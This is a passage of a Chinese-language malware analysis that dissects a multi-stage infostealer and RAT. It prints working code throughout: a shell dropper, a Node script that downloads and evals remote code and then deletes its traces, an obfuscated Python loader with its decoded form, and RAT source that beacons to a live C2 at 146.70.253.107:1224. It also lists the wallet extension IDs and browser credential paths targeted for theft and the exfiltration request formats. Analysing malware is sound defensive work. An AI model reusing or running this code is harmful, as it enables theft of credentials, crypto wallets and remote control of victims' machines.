   wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token=812&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjEuMTcyLjg2LjI0NSIsInNlc3Npb25JZCI6IjU0Zjc0NTVjLTY1MTItNDNiYi1iMzcwLThiODNiMTlkMWYzMCIsInN0ZXAiOjIsInRpbWVzdGFtcCI6MTc2ODcyMDcwMTA3MCwib3JpZ1Rva2VuIjoiODEyIiwiaWF0IjoxNzY4NzIwNzAxLCJleHAiOjE3Njg3MjA4ODF9.SiJbzWA1ccGDRofVI1Z-S3hYJfkUwvP84H1wUfdnLsY"
   wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/package.json"
else
   # If curl is available, use curl
   curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token=812&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjEuMTcyLjg2LjI0NSIsInNlc3Npb25JZCI6IjU0Zjc0NTVjLTY1MTItNDNiYi1iMzcwLThiODNiMTlkMWYzMCIsInN0ZXAiOjIsInRpbWVzdGFtcCI6MTc2ODcyMDcwMTA3MCwib3JpZ1Rva2VuIjoiODEyIiwiaWF0IjoxNzY4NzIwNzAxLCJleHAiOjE3Njg3MjA4ODF9.SiJbzWA1ccGDRofVI1Z-S3hYJfkUwvP84H1wUfdnLsY"
   curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/package.json"
fi

# Step 9: Install 'request' package
cd "$USER_HOME"
npm install --silent --no-progress --loglevel=error --fund=false

# Step 10: Run token parser
if [ -f "$USER_HOME/tokenParser.js" ]; then
   nohup node "$USER_HOME/tokenParser.js" > "$USER_HOME/tokenParser.log" 2>&1 &
else
   exit 1
fi

exit 0

```

這邊的 js 比較特別的是他除了下載後會eval 執行，還會將之前下載的的dropper 都刪除

```javascript
//tokenParser.js
const fs = require("fs");
const path = require("path");
const https = require("https");

const protocol = "https";
const domain = "link";
const separator = "://";
const pathPart = "/icons/";
const token = "812";
const subdomain = "rest-icon-provider";
const bearrtoken = "logo";
const basePath = __dirname;

const url = `${protocol}${separator}${subdomain}.${domain}${pathPart}${token}`;

const options = {
  method: "GET",
  headers: {
    bearrtoken: bearrtoken,
  },
};

https
  .get(url, options, (res) => {
    let data = "";

    if (res.statusCode !== 200) {
      console.error("Request failed:", res.statusCode);
      return;
    }

    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
      try {
        const code = JSON.parse(data);
        eval(code);
        setTimeout(() => {
          deleteFile("tokenParser.js");
          deleteFile("tokenlinux.sh");
          deleteFile("package.json");
          deleteFile("package-lock.json");
          deleteFile("token.cmd");
          deleteFile("token.sh");
          deleteFile("tokenParser.log");
          deleteFile(".npl");
          deleteFile("token");
          deleteFile("tokenParser.npl");
        }, 3000);
      } catch (err) {
        console.error("JSON parse failed:", err);
      }
    });
  })
  .on("error", (err) => {
    console.error("HTTPS request error:", err);
  });

function deleteFile(fileName) {
  const filePath = path.join(basePath, fileName);
  if (fs.existsSync(filePath)) {
    try {
      fs.unlinkSync(filePath);
      console.log(`Deleted file: ${fileName}`);
    } catch (err) {
      console.error(`Failed to delete file: ${fileName}`, err);
    }
  }
}

function deleteFolder(folderName) {
  const folderPath = path.join(basePath, folderName);
  if (fs.existsSync(folderPath)) {
    try {
      fs.rmSync(folderPath, { recursive: true, force: true });
      console.log(`Deleted folder: ${folderName}`);
    } catch (err) {
      console.error(`Failed to delete folder: ${folderName}`, err);
    }
  }
}
```

接下來是混淆過的 js ，不過檔案大小較 Sample 1 小，這類的 Javascript 負責的是 Information Stealer & Dropper

同樣解混淆後可以獲得以下資訊：

偷取資料並上傳，接收資料的路徑有兩個 `146.70.253[.]107:1224/upload` （主要）、 `23.227.203[.]18:1224/upload` （備份）

- `146.70.253[.]107:1224/upload` 會接收較少的資訊，但是是比較重要的
  - MetaMask

    ```
    nkbihfbeogaeaoehlefnkodbefgpgknn
    ```

  - OKX Wallet

    ```
    mcohilncbfahbmgdjkbpemcciiolgcge
    ```

  - Binance Chain Wallet

    ```
    fhbohimaelbohpjbbldcngcnapndodjp
    ```

  - TronLink

    ```
    ibnejdfjmmkpcnlpebklmnkoeoihofec
    ```

  - Solflare

    ```
    bhhhlbepdkbapadjdnnojkbgioiodbic
    ```

  - Solflare 新版

    ```
    fldfpgipfncgndfolcbkdeeknbbbnhcc
    ```

  - Solana CLI 私鑰

    ```
    ~/.config/solana/id.json
    ```

  - 如果是 mac
    - Chrome Login Data (macOS)
    - Brave Login Data (macOS)

  - 如果是 Windows/Linux
    - Chrome Login Data
    - Chrome Local State
    - Brave Login Data
    - Brave Local State
    - Opera Login Data
    - Opera Local State

- `23.227.203[.]18:1224/upload`則是會接收較多資訊
  - MetaMask

    ```
    nkbihfbeogaeaoehlefnkodbefgpgknn
    ```

  - MetaMask Edge

    ```
    ejbalbakoplchlghecdalmeeeajnimhm
    ```

  - Binance Chain Wallet

    ```
    fhbohimaelbohpjbbldcngcnapndodjp
    ```

  - Bitwarden

    ```
    nngceckbapebfimnlniiiahkandclblb
    ```

  - TronLink

    ```
    aeblfdkhhhdcdjpifhhbdiojplfjncoa
    ```

  - TronLink 新版

    ```
    ibnejdfjmmkpcnlpebklmnkoeoihofec
    ```

  - Phantom

    ```
    bfnaelmomeimhlpmgjnjophhpkkoljpa
    ```

  - Coin98

    ```
    aeachknmefphepccionboohckonoeemg
    ```

  - Crypto.com DeFi Wallet

    ```
    hifafgmccdpekplomjjkcfgodnhcellj
    ```

  - Kaikas

    ```
    jblndlipeogpafnldhgmapagcccfchpi
    ```

  - Sui Wallet

    ```
    opcgpfmipidbgpenhmajoajpbobppdil
    ```

  - Rabby Wallet

    ```
    acmacodkjbdgmoleebolmdjonilkdbch
    ```

  - Math Wallet

    ```
    dlcobpjiigpikoobohmabehhmhfoodbb
    ```

  - OKX Wallet

    ```
    mcohilncbfahbmgdjkbpemcciiolgcge
    ```

  - Core Wallet

    ```
    agoakfejjabomempkjlepdflaleeobhb
    ```

  - iWallet

    ```
    omaabbefbmiijedngplfjmnooppbclkk
    ```

  - Exodus Web3 Wallet

    ```
    aholpfdialjgjfhomihkjbmgjidlcdno
    ```

  - NiftyWallet

    ```
    nphplpgoakhhjchkkhmiggakijnkhfnd
    ```

  - Auro Wallet

    ```
    penjlddjkjgpnkllboccdgccekpkcbin
    ```

  - SafePal

    ```
    lgmpcpglpngdoalbgeoldeajfclnhafa
    ```

  - Solflare

    ```
    fldfpgipfncgndfolcbkdeeknbbbnhcc
    ```

  - Solflare 舊版

    ```
    bhhhlbepdkbapadjdnnojkbgioiodbic
    ```

  - Coin98 重複

    ```
    aeachknmefphepccionboohckonoeemg
    ```

  - Jaxx Liberty

    ```
    gjnckgkfmgmibbkoficdidcljeaaaheg
    ```

  - Math Wallet 新版

    ```
    afbcbjpbpfadlkmhmclhkeeodmamcflc
    ```

  - Exodus Wallet

    ```
    Windows:  ~/AppData/Roaming/Exodus/exodus.wallet
    macOS: ~/Library/Application Support/exodus.wallet
    Linux: ~/.config/Exodus/exodus.wallet
    ```

  - Firefox moz-extension IDB

    ```
    ~/AppData/Roaming/Mozilla/Firefox/Profiles/*/storage/default/moz-extension*/idb）
    ```

  - 如果是 Windows
    - Edge 錢包擴充套件資

      ```
      ~/AppData/Local/Microsoft/Edge/User Data
      ```

  - 如果是 macOS
    - macOS Keychain

      ```
      ~/Library/Keychains/login.keychain-db
      ```

    - Chrome Login Data

    - Brave Login Data
  * 如果是 Windows/Linux
    - Chrome Login Data
    - Chrome Local State
    - Brave Login Data
    - Brave Local State
    - Opera Login Data
    - Opera Local State

以上竊取到的資訊，都會先暫存到 `~./n3/` 資料夾底下再進行上傳

兩個 ip 的 HTTP POST 的範例結構

```http
POST /uploads HTTP/1.1
Host: <146.70.253[.]107:1224 / 23.227.203[.]18:1224>
Content-Type: multipart/form-data; boundary=<boundary>

------<boundary>
Content-Disposition: form-data; name="type"

15
------<boundary>
Content-Disposition: form-data; name="hid"

812_<hostname>
------<boundary>
Content-Disposition: form-data; name="uts"

<unix_timestamp>
------<boundary>
Content-Disposition: form-data; name="multi_file"; filename="<filename>"
Content-Type: <content-type>

<binary_file_content>
------<boundary>--
```

這類的 Sample 執行到這邊還沒有結束。

接下來會向 `http://146.70.253[.]107:1224/client/15/812` 獲得一個 下一階段的 python 檔案，並儲存在 `~/.nlq`

並訪問 `https://api.npoint[.]io/96979650f5739bcbaebb ` 獲得配置文件，

```
{"A":1,"B":1,"C":1,"name":"winrar"}
```

這邊配置文件主要是定位 windows python 的執行環境

- windows 環境
  - 他會去看`%USERPROFILE%\winrar\python.exe` 路徑存不存在 如果不存在會去`http://146.70.253[.]107:1224/pdown` 下載 python3.11 的整包執行環境，下載後執行`%USERPROFILE%\winrar\python.exe ~/.nlq`
- 其他作業系統
  - 直接執行`python3 ~/.nlq`

接下來分析 .nlq 檔案，這個檔案被包裝成做數次的 zlib decompress + base64decode 的 script

```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
```

將這個檔案decode 過後，為以下程式碼

```python
import base64,platform,os,subprocess,sys
try:import requests
except:subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests']);import requests

sType = "15"
gType = "812"
ot = platform.system()
home = os.path.expanduser("~")

mainUpdateDate = "Updated on 5th August"

host1 = "146.70.253.107"
host2 = f'http://{host1}:1224'
pd = os.path.join(home, ".n2")
ap = pd + "/way"

def download_payload():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass

    try:
        if ot=="Darwin":
            # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True)
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        else:
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_payload()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])

if ot=="Darwin":sys.exit(-1)

ap = pd + "/pow"

def download_browse():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass
    try:
        aa=requests.get(host2+"/brow/"+ sType +"/"+gType, allow_redirects=True)
        with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_browse()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])

```

發現他使用HTTP GET 請求了`http://146.70.253[.]107:1224/payload/15/812` 與 `http://146.70.253[.]107:1224/brow/15/812` ，分別儲存成 `~/.n2/way `以及 `~/.n2/pow` 並且執行了他們

---

#### ~/.n2/way

這邊主要在進行 C2 的控制命令。

首先會先向 `http://146.70.253[.]107:1224/keys` 做初始通知，帶上 Host Info 以及 SysInfo

HTTP POST 請求如下

```http
POST /keys HTTP/1.1
Host: 146.70.253.107:1224
Content-Type: application/x-www-form-urlencoded
User-Agent: python-requests/x.x.x
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: <Length>

ts=<Timestamp_Milliseconds>&type=15&hid=812_<Hostname>&ss=sys_info&cc={'uuid': '<UUID>', 'system': '<OS>', 'release': '<Release>', 'version': '<Version>', 'hostname': '812_<Hostname>', 'username': '<Username>', 'net_info': {'query': '<Public_IP>', 'country': '<Country>', 'city': '<City>', ...}}
```

接下來利用 TCP socket 向 `146.70.253[.]107:2241` 進行連線，並進入無限迴圈等待接收指令。以下是 Command Table

1. ssh_obj：執行 Shell命令
2. ssh cmd : Kill Python Process
3. ssh_clip : 如果是 windows 獲取 Keylogger + clipboard 內容，其他作業系統則回傳空字串
4. sshrun : 下載 pow 程式到`~/.n2/bow`
5. ssh_upload : 上傳指定目錄/檔案到 `http://146.70.253[.]107:1224/uploads`
6. ssh_kill:Kill Chrome/Brave process
7. sshany：由 `http://146.170.253[.]107:1224/adc/15` 下載並執行 Anydesk 模組
8. ssh_env：搜尋 .env 檔案並上傳 `http://146.70.253[.]107:1224/uploads`

HTTP POST 上傳範例

```http
POST /uploads HTTP/1.1
Host: 146.70.253.107:1224
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<RandomString>
User-Agent: python-requests/x.x.x
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: <Length>

----------WebKitFormBoundary<RandomString>
Content-Disposition: form-data; name="type"

15
----------WebKitFormBoundary<RandomString>
Content-Disposition: form-data; name="hid"

812_<Hostname>
----------WebKitFormBoundary<RandomString>
Content-Disposition: form-data; name="uts"

<Upload_Tag>
----------WebKitFormBoundary<RandomString>
Content-Disposition: form-data; name="multi_file"; filename="<Timestamp>_<Filename>"
Content-Type: application/octet-stream

<Binary_File_Content>
----------WebKitFormBoundary<RandomString>--
```

上傳成功後會在 `~/.n2/flist` 紀錄攻擊的紀錄

##### ~/.n2/way 完整程式

```python
import base64,socket
from uuid import getnode
from requests import get,post
from hashlib import sha256
from getpass import getuser
from platform import system,node,release,version
import time

sType = "15"
gType = "812"

payUpdateDate = "Updated on 5th August"

class HostInfo(object):
    def __init__(A):
        A.system=system()
        if gType == "root":
            A.hostname=node()
        else:
            A.hostname=gType + "_" + node()
        A.release=release()
        A.version=version()
        A.username=getuser()
        A.uuid=A.getID()
    def getID(A):return sha256((str(getnode())+getuser()).encode()).digest().hex()
    def sysinfo(A):return{'uuid':A.uuid,'system':A.system,'release':A.release,'version':A.version,'hostname':A.hostname,'username':A.username}

class Position(object):
    def __init__(A):A.geo=A.get_geo();A.internal_ip=A.get_internal_ip()
    def get_internal_ip(A):
        try:return socket.gethostbyname_ex(hn)[-1][-1]
        except:return''
    def get_geo(A):
        try:return get('http://ip-api.com/json').json()
        except:pass
    def net_info(A):
        g=A.get_geo()
        if g:
            ii=A.internal_ip
            if ii:g['internalIp']=ii
        return g

class SysInfo(object):
    def __init__(A):A.net_info=Position().net_info();A.sys_info=HostInfo().sysinfo()
    def parse(K,data):
        J='regionName';I='country';H='query';G='city';F='isp';E='zip';D='lon';C='lat';B='timezone';_A='internalIp'
        A=data;A={C:A[C]if C in A else'',D:A[D]if D in A else'',E:A[E]if E in A else'',F:A[F]if F in A else'',G:A[G]if G in A else'',H:A[H]if H in A else'',I:A[I]if I in A else'',B:A[B]if B in A else'',J:A[J]if J in A else'',_A:A[_A]if _A in A else''}
        if'/'in A[B]:A[B]=A[B].replace('/',' ')
        if'_'in A[B]:A[B]=A[B].replace('_',' ')
        return A
    def get_info(A):B=A.net_info;return{'sys_info':A.sys_info,'net_info':A.parse(B if B else[])}

# host="LjE3LjI0OTUuMTY0"
#host="  NTEuMjEy  MTAuMTAu"
PORT = 1224
HOST = '146.70.253.107'
if gType == "root":
    hn = socket.gethostname()
else:
    hn = gType + "_" + socket.gethostname()

class Trans(object):
    def __init__(A):A.sys_info=SysInfo().get_info()
    def contact_server(A,ip,port):
        A.ip,A.port=ip,int(port);B=int(time.time()*1000);C={'ts':str(B),'type':sType,'hid':hn,'ss':'sys_info','cc':str(A.sys_info)};D=f"http://{A.ip}:{A.port}/keys"
        try:post(D,data=C)
        except Exception as e:pass
def run_comm():c=Trans();c.contact_server(HOST, PORT);del c
run_comm()

import base64,platform,socket
from time import sleep
from socket import timeout as TimeOutError
import time
from datetime import datetime,timezone,timedelta
import json,os,struct,subprocess
from threading import Thread,RLock,Timer
import requests,ftplib
import ast
sHost = socket.gethostname()
# host="LjE3LjI0OTUuMTY0"
#host="  NTEuMjEy  MTAuMTAu"
_T=True;_F=False;_N=None;_A='admin';_O='output'
class Session(object):
    def __init__(A,sock):A.sock=sock;A.info={'type':0,'group':sType,'name':sHost}
    def shutdown(A):
        try:A.sendall('[close]');A.sock.shutdown(socket.SHUT_RDWR);A.sock.close()
        except:pass
    def connect(A,ip,port):
        A.sock.connect((ip,port));sleep(.5)
        A.send(code=0,args=A.info)
        sleep(.5);return _T
    def struct(A,code=_N,args=_N):return json.dumps({'code': code,'args': args})
    def send(A,code=_N,args=_N):d=A.struct(code, args);A.sendall(d)
    def sendall(A,data):
        try:
            try:ii = data.encode()
            except:ii = data
            ii = struct.pack('>I', len(ii)) + ii
            A.sock.sendall(ii)
        except:pass
    def recv(A):
        try:
            print("start ses recv")
            ll = A.recvall(4)
            print("ses recv size:", ll)
            if not ll:return _N
            ml = struct.unpack('>I', ll)[0]
            print("ses recv:", ml)
            # Read the message datacls
            return A.recvall(ml)
        except TimeOutError:return -1
        except:pass
    def recvall(A,size):
        try:
            d = bytearray()
            while len(d) < size:
                pt = A.sock.recv(size - len(d))
                if not pt:return _N
                d.extend(pt)
            return d
        except:return _N

e_buf = ""
def decode_str(ss):
    try:r=ss.decode('utf8');return r
    except:
        try:r=ss.decode('cp1252');return r
        except:
            try:r=ss.decode('mac_roman');return r
            except:return ss

